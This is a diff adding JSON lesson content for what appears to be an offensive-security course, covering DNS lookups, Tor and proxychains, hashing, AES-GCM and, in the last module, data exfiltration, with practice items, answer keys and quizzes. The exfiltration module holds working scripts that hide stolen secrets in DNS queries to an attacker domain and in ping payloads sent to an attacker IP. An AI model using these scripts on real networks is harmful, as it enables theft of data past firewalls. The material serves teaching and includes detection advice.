@@ -1,0 +1,342 @@
+{
+"m3-1": {
+"steps": [
+{
+"type": "concept",
+"heading": "The Global Phonebook",
+"body": "Computers don't understand domain names like google.com. They only speak IP addresses. The Domain Name System (DNS) is the global phonebook that translates human-readable names into machine-routable numbers.\n\nIPv4 addresses (e.g., 192.168.1.1) are older, 32-bit numbers that ran out years ago. IPv6 addresses (e.g., 2600::1) are massive 128-bit replacements. When targeting a network, DNS is your first recon step. It reveals subdomains, mail servers, and internal naming conventions."
+},
+{
+"type": "concept",
+"heading": "The Resolution Chain",
+"body": "When you type a URL, your machine doesn't just know the answer. It asks a Local Resolver (usually your router or ISP). If they don't know, they ask the Root Servers, then the TLD servers (.com), and finally the Authoritative Name Server for that specific domain.\n\nThis chain is entirely built on trust. Historically, DNS queries are sent in plaintext over UDP port 53. If an attacker sits between you and the resolver, they can intercept the query and lie about the answer, redirecting you to a malicious server."
+},
+{
+"type": "code",
+"heading": "Querying IPv4",
+"body": "Python's built-in socket library gives us native access to the OS-level DNS resolver to pull IPv4 addresses.",
+"code": "import socket\n\ndef resolve_target(domain):\n    try:\n        # gethostbyname asks the OS to resolve an A record (IPv4)\n        ip_address = socket.gethostbyname(domain)\n        print(f"[+] {domain} resolves to {ip_address}")\n        return ip_address\n    except socket.gaierror:\n        # gaierror = Get Address Info Error\n        print(f"[-] Failed to resolve {domain}")\n\ntarget_ip = resolve_target("example.com")"
+},
+{
+"type": "code_practice",
+"heading": "Resolve the Host",
+"context": "Use the "socket.gethostbyname" function to resolve `target_domain` to an IPv4 address.",
+"code_before": "import socket\ntarget_domain = "dev.internal.corp"\n# Ask the OS resolver for the IP\nip_addr = ",
+"code_after": "(target_domain)\nprint(ip_addr)",
+"correct_answer": "socket.gethostbyname"
+},
+{
+"type": "code",
+"heading": "Extracting IPv6",
+"body": "IPv6 uses a different record type (AAAA). To pull these, we use `getaddrinfo`, which returns a wealth of routing data.",
+"code": "import socket\n\n# We request address info specifically for the IPv6 family\n# AF_INET6 refers to the Address Family for IPv6\nresults = socket.getaddrinfo("google.com", 443, socket.AF_INET6)\n\nprint("[*] Discovered IPv6 Addresses:")\nfor result in results:\n    # The result is a tuple. The 5th item [4] contains the IP/Port tuple\n    ip_info = result[4]\n    ipv6_address = ip_info[0]\n    print(f"    -> {ipv6_address}")"
+},
+{
+"type": "code_practice",
+"heading": "Define the Family",
+"context": "Specify the address family "socket.AF_INET6" to force the resolver to look for IPv6 (AAAA) records.",
+"code_before": "import socket\n# Request only IPv6 records for the target\ninfo = socket.getaddrinfo("target.local", 80, ",
+"code_after": ")\nprint(info[0][4][0])",
+"correct_answer": "socket.AF_INET6"
+},
+{
+"type": "concept",
+"heading": "Reverse Lookups & OPSEC",
+"body": "Forward DNS is Name -> IP. Reverse DNS is IP -> Name using PTR records. \n\nWhen attacking, you often only have an IP address. A reverse lookup can reveal the hostname, which might tell you its purpose (e.g., `db-prod-01.corp.local`). However, be warned: performing a reverse lookup sends traffic to the DNS server owning that IP block. If you are trying to remain stealthy, generating massive amounts of DNS traffic will alert the Blue Team's network monitors."
+},
+{
+"type": "code_practice",
+"heading": "Reverse the IP",
+"context": "Use the "socket.gethostbyaddr" function to perform a reverse DNS lookup on the `target_ip`.",
+"code_before": "import socket\ntarget_ip = "8.8.8.8"\n# Perform a reverse lookup to find the domain name\nhostname, aliases, ips = ",
+"code_after": "(target_ip)\nprint("Hostname:", hostname)",
+"correct_answer": "socket.gethostbyaddr"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "You intercept a DNS response packet. It contains a record type of 'AAAA'. What kind of address does this record hold?",
+"options": [
+"A 32-bit IPv4 address.",
+"A 128-bit IPv6 address.",
+"A mail server routing address.",
+"An alias pointing to another domain name."
+],
+"correct": 1,
+"hint": "A records are for older IPs. AAAA records are for the massively expanded modern IPs."
+}
+]
+},
+"m3-2": {
+"steps": [
+{
+"type": "concept",
+"heading": "The Illusion of Privacy",
+"body": "A VPN is just an encrypted tunnel to someone else's computer. Your ISP can't see your traffic, but the VPN provider sees absolutely everything. They know who you are and where you are going. If law enforcement knocks, they will hand over the logs.\n\nTor (The Onion Router) is fundamentally different. It bounces your traffic through three random volunteer nodes. The Entry node knows who you are, but not where you are going. The Exit node knows where you are going, but not who you are. The Middle node knows neither. It is mathematically designed to prevent any single entity from linking the source to the destination."
+},
+{
+"type": "concept",
+"heading": "The OPSEC Failure",
+"body": "Tor guarantees network anonymity, but it cannot fix human stupidity or application leaks.\n\nIf you route a browser through Tor but leave WebRTC enabled, your real IP leaks. If you use Tor but log into your personal Gmail account, you just tied your anonymous traffic to your real identity. The most common technical failure is the DNS leak: routing TCP traffic through Tor, but letting your OS resolve DNS via your local ISP in plaintext. Your ISP knows exactly what domains you are visiting."
+},
+{
+"type": "code",
+"heading": "Routing with Proxychains",
+"body": "In Bash, `proxychains` is the standard tool to force any command-line application's TCP traffic through the Tor network locally.",
+"code": "#!/bin/bash\n# Proxychains intercepts socket calls and routes them through a proxy list\n# (usually defined in /etc/proxychains4.conf, pointing to Tor on 127.0.0.1:9050)\n\necho "[*] Scanning target anonymously..."\n# We use -sT (TCP Connect scan) because Tor only supports TCP, not UDP or raw SYN.\n# We use -Pn (No Ping) because ICMP ping packets cannot be routed over Tor.\nproxychains4 nmap -sT -Pn -p 80,443 target.onion\n\necho "[*] Scan complete. Your origin IP was hidden.""
+},
+{
+"type": "code_practice",
+"heading": "Force the Route",
+"context": "Use the "proxychains4" command to force the execution of `curl ipinfo.io` through the configured proxy network.",
+"code_before": "# Ensure curl's traffic is masked by Tor\n",
+"code_after": " curl ipinfo.io",
+"correct_answer": "proxychains4"
+},
+{
+"type": "code",
+"heading": "Direct SOCKS5 Usage",
+"body": "If you don't want to use proxychains, many modern tools natively support SOCKS5 proxies. We can point them directly at the Tor daemon.",
+"code": "#!/bin/bash\n# The Tor service locally binds to port 9050 by default.\n\necho "[*] Checking public IP through direct connection..."\ncurl [https://check.torproject.org/api/ip](https://www.google.com/search?q=https://check.torproject.org/api/ip)\n\necho "[*] Checking public IP through Tor SOCKS5 proxy..."\n# --socks5-hostname tells curl to route traffic AND DNS resolution through the proxy\n# This critically prevents DNS leaks.\ncurl --socks5-hostname 127.0.0.1:9050 [https://check.torproject.org/api/ip](https://www.google.com/search?q=https://check.torproject.org/api/ip)\n\necho "[*] If the IPs differ, Tor is working.""
+},
+{
+"type": "code_practice",
+"heading": "Prevent DNS Leaks",
+"context": "Use the "--socks5-hostname" flag to tell `curl` to pass DNS resolution requests to the Tor proxy instead of the local machine.",
+"code_before": "# Route traffic and DNS through the Tor daemon securely\ncurl ",
+"code_after": " 127.0.0.1:9050 [http://hidden-service.onion](https://www.google.com/search?q=http://hidden-service.onion)",
+"correct_answer": "--socks5-hostname"
+},
+{
+"type": "concept",
+"heading": "Timing and Correlation",
+"body": "The ultimate threat to Tor is Global Passive Adversaries (like the NSA). If they monitor both the entry node and the exit node, they can't break the encryption, but they can measure the exact size and timing of the packets. \n\nIf a 4.2MB burst of traffic enters node A, and exactly 0.8 seconds later a 4.2MB burst exits node C, they can mathematically correlate the user to the destination. To counter this, advanced threat actors add artificial delays and pad their traffic with junk bytes to break the timing signatures."
+},
+{
+"type": "code_practice",
+"heading": "Strict Routing",
+"context": "Set the proxychains configuration variable to "strict_chain" to ensure traffic must pass through every listed proxy in exact order.",
+"code_before": "# Inside /etc/proxychains.conf\n# Enforce rigid routing rules to avoid bypassing dead proxies\n",
+"code_after": "\n# dynamic_chain\n# random_chain",
+"correct_answer": "strict_chain"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "You run `proxychains4 nmap -sS target.com`. The command fails to reach the target. Why?",
+"options": [
+"The target has a firewall blocking port 80.",
+"Tor only routes UDP traffic, not TCP.",
+"Proxychains cannot route raw SYN packets (-sS); it requires full TCP connections (-sT).",
+"You must use a VPN before starting the Tor service."
+],
+"correct": 2,
+"hint": "Tor operates at the transport layer by establishing complete, valid socket connections. It cannot forward half-open raw packets."
+}
+]
+},
+"m3-3": {
+"steps": [
+{
+"type": "concept",
+"heading": "Keys to the Kingdom",
+"body": "Cryptography is math used to hide secrets. Symmetric encryption uses the exact same key to lock and unlock the door. It's incredibly fast, but you have the 'Key Distribution Problem': how do you securely give the key to your friend without someone intercepting it?\n\nAsymmetric encryption (like RSA) uses two keys: a Public Key to lock the door, and a Private Key to unlock it. You can publish your Public Key to the entire world. Anyone can encrypt a message to you, but only you, holding the Private Key, can decrypt it. It solves the distribution problem, but it's mathematically slow."
+},
+{
+"type": "concept",
+"heading": "Hash vs Encode vs Encrypt",
+"body": "Encoding (Base64) is just translating data into a different alphabet so it transports easily; there is no key, anyone can reverse it. It provides zero security.\n\nEncryption uses a key to scramble data. It is inherently reversible if you have the key.\n\nHashing (SHA-256) is a one-way mathematical blender. You pour a file in, and get a fixed-size 64-character string out. You cannot reverse a hash back into the file. We use hashes to verify file integrity and securely store passwords."
+},
+{
+"type": "code",
+"heading": "The One-Way Blender",
+"body": "Python's `hashlib` makes it trivial to calculate the cryptographic hash of a string or file.",
+"code": "import hashlib\n\ndef hash_password(password_string):\n    # Hashes require raw bytes, so we encode the string to UTF-8\n    raw_bytes = password_string.encode('utf-8')\n    \n    # We initialize the SHA-256 algorithm\n    hasher = hashlib.sha256()\n    hasher.update(raw_bytes)\n    \n    # hexdigest() returns the final hash as a readable hex string\n    final_hash = hasher.hexdigest()\n    print(f"[*] SHA-256: {final_hash}")\n    return final_hash"
+},
+{
+"type": "code_practice",
+"heading": "Invoke the Algorithm",
+"context": "Use the "hashlib.sha256" function to initialize a new SHA-256 hashing object.",
+"code_before": "import hashlib\npayload = b"malware_code"\n# Initialize the cryptographic hash object\nhash_obj = ",
+"code_after": "(payload)\nprint(hash_obj.hexdigest())",
+"correct_answer": "hashlib.sha256"
+},
+{
+"type": "code",
+"heading": "The Core of Symmetric",
+"body": "Almost all symmetric encryption relies on the XOR (`^`) bitwise operation. XOR compares two bits. If they are the same, the output is 0. If they are different, the output is 1.",
+"code": "# XOR has a magic property: if A XOR B = C, then C XOR B = A.\n# The key applies the encryption, and applying the exact same key decrypts it.\n\ndef xor_cipher(data, key):\n    encrypted = bytearray()\n    for i in range(len(data)):\n        # We iterate over the data bytes and XOR them with the key bytes\n        # The modulo (%) ensures the key loops if it's shorter than the data\n        data_byte = data[i]\n        key_byte = key[i % len(key)]\n        encrypted.append(data_byte ^ key_byte)\n        \n    return bytes(encrypted)\n\n# Note: A simple XOR cipher is easily broken via frequency analysis."
+},
+{
+"type": "code_practice",
+"heading": "The Magic Operator",
+"context": "Use the bitwise XOR operator "^" to scramble the `plaintext_byte` with the `key_byte`.",
+"code_before": "plaintext_byte = 0x41 # 'A'\nkey_byte = 0x13\n# Scramble the byte\ncipher_byte = plaintext_byte ",
+"code_after": " key_byte\n# Reversing it: cipher_byte ^ key_byte == 0x41",
+"correct_answer": "^"
+},
+{
+"type": "concept",
+"heading": "Entropy and Salts",
+"body": "If two users have the password 'admin', their SHA-256 hashes will be identical. An attacker can pre-compute millions of common hashes (Rainbow Tables) and instantly crack them.\n\nTo destroy Rainbow Tables, we use a 'Salt'. A salt is a chunk of random data appended to the password before hashing. Even if two passwords are identical, their salts are different, meaning their final hashes will be radically different. Randomness (Entropy) is the armor of cryptography."
+},
+{
+"type": "code_practice",
+"heading": "Generate Random Bytes",
+"context": "Use "os.urandom(16)" to generate 16 cryptographically secure random bytes for a salt.",
+"code_before": "import os, hashlib\n# Generate a secure random 16-byte salt\nsalt = ",
+"code_after": "\npassword = b"hunter2"\nsecure_hash = hashlib.sha256(salt + password).hexdigest()",
+"correct_answer": "os.urandom(16)"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "A developer encodes a secret API token in Base64 and stores it in a public repository. Why is this a critical security failure?",
+"options": [
+"Base64 requires a 256-bit key to decrypt, which was likely lost.",
+"Base64 is just an encoding scheme, not encryption. Anyone can decode it instantly without a key.",
+"The repository cannot process Base64 encoded strings natively.",
+"Base64 is a hashing algorithm, meaning the API token can never be recovered by the app."
+],
+"correct": 1,
+"hint": "Encoding only changes the format of data for transport. It does not provide confidentiality."
+}
+]
+},
+"m3-4": {
+"steps": [
+{
+"type": "concept",
+"heading": "The Gold Standard",
+"body": "AES (Advanced Encryption Standard) with a 256-bit key is the gold standard for symmetric encryption. It is used by militaries, banks, and ransomware operators alike. It relies on highly complex substitution and permutation networks.\n\nHowever, AES is a 'block cipher'. It encrypts data in strict 16-byte chunks. If your data is larger than 16 bytes, you have to decide how to chain these chunks together. This is called the Mode of Operation."
+},
+{
+"type": "concept",
+"heading": "Authentic Encryption",
+"body": "Old modes like ECB (Electronic Codebook) are horribly flawed because identical plaintext blocks produce identical ciphertext blocks, leaving visual patterns in the data.\n\nModern cryptography demands Authenticated Encryption. We don't just want to hide the data; we want cryptographic proof that nobody tampered with the ciphertext while it was in transit. GCM (Galois/Counter Mode) does exactly this. It encrypts the data AND generates a mathematical 'Tag' (a MAC). If an attacker flips a single bit of the encrypted file, the Tag verification will fail, and the decryption aborts."
+},
+{
+"type": "code",
+"heading": "Encrypting with GCM",
+"body": "Using Python's `pycryptodome` library, we set up AES-GCM. It requires a Key and a random Nonce (Number Used Once).",
+"code": "from Crypto.Cipher import AES\nimport os\n\ndef encrypt_data(plaintext_bytes, key_32_bytes):\n    # GCM requires a unique Nonce (usually 16 bytes) for every encryption\n    nonce = os.urandom(16)\n    \n    # Initialize the AES cipher in GCM mode\n    cipher = AES.new(key_32_bytes, AES.MODE_GCM, nonce=nonce)\n    \n    # encrypt_and_digest performs the encryption and generates the integrity tag\n    ciphertext, tag = cipher.encrypt_and_digest(plaintext_bytes)\n    \n    # We must store the nonce and tag alongside the ciphertext to decrypt later\n    print("[*] Encryption successful. Tag generated.")\n    return nonce, ciphertext, tag"
+},
+{
+"type": "code_practice",
+"heading": "Specify the Mode",
+"context": "Specify "AES.MODE_GCM" as the second argument to enforce Authenticated Encryption.",
+"code_before": "from Crypto.Cipher import AES\n# Initialize the cipher using the safest block mode\ncipher = AES.new(secret_key, ",
+"code_after": ", nonce=iv)",
+"correct_answer": "AES.MODE_GCM"
+},
+{
+"type": "code",
+"heading": "Verifying the Tag",
+"body": "Decryption is exactly the reverse, but critically, we must verify the tag BEFORE we trust the decrypted plaintext.",
+"code": "from Crypto.Cipher import AES\n\ndef decrypt_data(nonce, ciphertext, tag, key_32_bytes):\n    # We rebuild the cipher object using the exact same key and nonce\n    cipher = AES.new(key_32_bytes, AES.MODE_GCM, nonce=nonce)\n    \n    try:\n        # decrypt_and_verify attempts decryption and strictly checks the MAC tag\n        plaintext = cipher.decrypt_and_verify(ciphertext, tag)\n        print("[+] Decryption and verification successful.")\n        return plaintext\n        \n    except ValueError:\n        # If the tag is wrong, ValueError is raised. The data is corrupted or tampered with.\n        print("[-] CRITICAL: Integrity check failed. Ciphertext tampered with.")\n        return None"
+},
+{
+"type": "code_practice",
+"heading": "Check Integrity",
+"context": "Use the "verify" method on the cipher object (within older implementations) or specifically call `decrypt_and_verify` in modern ones. Here, assign the method "decrypt_and_verify" to execute the check.",
+"code_before": "cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\n# Decrypt the data and validate the authentication tag simultaneously\nclean_text = cipher.",
+"code_after": "(ciphertext, tag)",
+"correct_answer": "decrypt_and_verify"
+},
+{
+"type": "concept",
+"heading": "The Nonce Re-use Catastrophe",
+"body": "GCM mode turns AES into a stream cipher. This means the key and the Nonce are combined to generate a massive stream of random bits, which is then XOR'd against your data.\n\nHere is the absolute iron law of GCM: You must NEVER reuse a Nonce with the same Key. If you encrypt two different files using the same Key and the same Nonce, the underlying bit-stream is identical. An attacker can XOR the two ciphertexts together, completely canceling out the encryption key, and immediately recover the plaintexts. Hardcoding a Nonce is a catastrophic vulnerability."
+},
+{
+"type": "code_practice",
+"heading": "Never Hardcode",
+"context": "Use "os.urandom" to generate 16 fresh random bytes for every single encryption operation.",
+"code_before": "import os\n# Generate a cryptographically secure, unique Nonce\nfresh_nonce = ",
+"code_after": "(16)\ncipher = AES.new(key, AES.MODE_GCM, nonce=fresh_nonce)",
+"correct_answer": "os.urandom"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "An attacker intercepts an AES-GCM encrypted payload, modifies a few bytes of the ciphertext, and forwards it to the destination. What happens when the destination attempts to decrypt it?",
+"options": [
+"The decryption succeeds, but the resulting plaintext contains garbage characters.",
+"The destination's CPU will crash due to a buffer overflow in the AES block.",
+"The decryption fails and throws an error because the authentication tag no longer matches the modified ciphertext.",
+"The AES algorithm automatically repairs the flipped bits using parity checks."
+],
+"correct": 2,
+"hint": "GCM provides Authenticated Encryption. It mathematically links the ciphertext to the tag."
+}
+]
+},
+"m3-5": {
+"steps": [
+{
+"type": "concept",
+"heading": "The Quiet Exfiltration",
+"body": "You have the data. Now you need to get it out. Stealing data quietly is often harder than the initial breach. Corporate firewalls aggressively block outbound FTP, SSH, and unknown HTTP POST requests.\n\nTo bypass egress filters, we 'live off the land' using protocols that are explicitly allowed. ICMP (Ping) and DNS are required for networks to function, so they are rarely blocked entirely. By embedding our stolen data into the headers or payload fields of these innocent protocols, we can smuggle data right past the firewall."
+},
+{
+"type": "concept",
+"heading": "Smuggling via DNS",
+"body": "DNS is a hierarchical request system. If you ask for `info.evil.com`, the request eventually reaches the attacker's name server controlling `evil.com`.\n\nIf we encode a stolen password into a valid domain string and query it (e.g., `pA55w0rd.evil.com`), the corporate firewall happily forwards the request. The attacker's server receives the query, logs the subdomain, and successfully captures the password. The firewall only sees a normal DNS resolution."
+},
+{
+"type": "code",
+"heading": "DNS Exfil Script",
+"body": "We encode the stolen data using Base64 to ensure it only contains valid characters for a DNS subdomain.",
+"code": "import base64\nimport socket\n\ndef exfiltrate_dns(secret_data, attacker_domain):\n    # 1. Convert data to bytes and encode to Base64\n    # Note: Base64 can produce '=' padding, which is invalid in DNS. We strip it.\n    b64_data = base64.b64encode(secret_data.encode()).decode().replace('=', '')\n    \n    # 2. Craft the malicious FQDN: <encoded_data>.attacker.com\n    target_fqdn = f"{b64_data}.{attacker_domain}"\n    \n    print(f"[*] Sending query for: {target_fqdn}")\n    \n    try:\n        # 3. Ask the OS to resolve it. The data leaves the network.\n        socket.gethostbyname(target_fqdn)\n    except:\n        pass # We don't actually care if it resolves, only that the query was sent"
+},
+{
+"type": "code_practice",
+"heading": "Encode the Secret",
+"context": "Use the "base64.b64encode" function to securely encode the `raw_data` for transport.",
+"code_before": "import base64\nraw_data = b"id_rsa_key"\n# Encode the bytes into web-safe characters\nsafe_string = ",
+"code_after": "(raw_data)\nprint(safe_string)",
+"correct_answer": "base64.b64encode"
+},
+{
+"type": "code",
+"heading": "ICMP Payload Stuffing",
+"body": "The ICMP Ping protocol has an optional 'Data' field used to measure packet latency. We can shove anything we want in there using Scapy.",
+"code": "from scapy.all import IP, ICMP, send\n\ndef exfiltrate_icmp(secret_data, attacker_ip):\n    print("[*] Building malicious ICMP packet...")\n    \n    # 1. IP Layer: Define the destination\n    ip_layer = IP(dst=attacker_ip)\n    \n    # 2. ICMP Layer: Standard echo request (Type 8)\n    icmp_layer = ICMP()\n    \n    # 3. Raw Payload: Stuffing the secret data into the ping\n    # We stack the layers using the '/' operator in Scapy\n    packet = ip_layer / icmp_layer / secret_data\n    \n    # 4. Send the packet out over the wire\n    send(packet, verbose=False)\n    print("[+] Data pinged out successfully.")"
+},
+{
+"type": "code_practice",
+"heading": "The Raw Layer",
+"context": "Use Scapy's "Raw" class to explicitly wrap the `secret_data` as raw bytes before appending it to the packet.",
+"code_before": "from scapy.all import IP, ICMP, Raw, send\npacket = IP(dst="10.0.0.5") / ICMP() / ",
+"code_after": "(load="CONFIDENTIAL_DATA")\nsend(packet)",
+"correct_answer": "Raw"
+},
+{
+"type": "concept",
+"heading": "Blue Team Detection",
+"body": "These methods are stealthy, but not invisible. \n\nA normal DNS query for `google.com` is short. If a Blue Team monitors query lengths, a DNS query for a 63-character string like `abc123xyz...evil.com` stands out immediately. Similarly, a normal Windows ping is exactly 32 bytes of predictable data (`abcdefghijklmnopqrstuvwabcdefghi`). If the IPS sees a ping containing 1400 bytes of highly entropic, encrypted data, it will trigger an alarm."
+},
+{
+"type": "code_practice",
+"heading": "Extract the Payload",
+"context": "Access the inner data payload of the sniffed packet using the ".load" attribute of the Raw layer.",
+"code_before": "# On the attacker server, sniffing the incoming ICMP packet\nif packet.haslayer(Raw):\n    # Extract the smuggled data\n    stolen_bytes = packet[Raw]",
+"code_after": "\n    print("Captured:", stolen_bytes)",
+"correct_answer": ".load"
+},
+{
+"type": "quiz",
+"heading": "Knowledge Check",
+"question": "An attacker needs to exfiltrate a 50MB database out of a corporate network. Why is DNS exfiltration a terrible choice for this specific task?",
+"options": [
+"DNS is only allowed inbound, not outbound.",
+"DNS queries are limited in size (usually max 63 chars per subdomain), meaning the attacker would have to send hundreds of thousands of noisy queries.",
+"DNS packets are automatically encrypted by the firewall, destroying the payload.",
+"DNS does not resolve IPs on internal corporate networks."
+],
+"correct": 1,
+"hint": "Think about the size constraints of a domain name compared to a massive database."
+}
+]
+}
+}
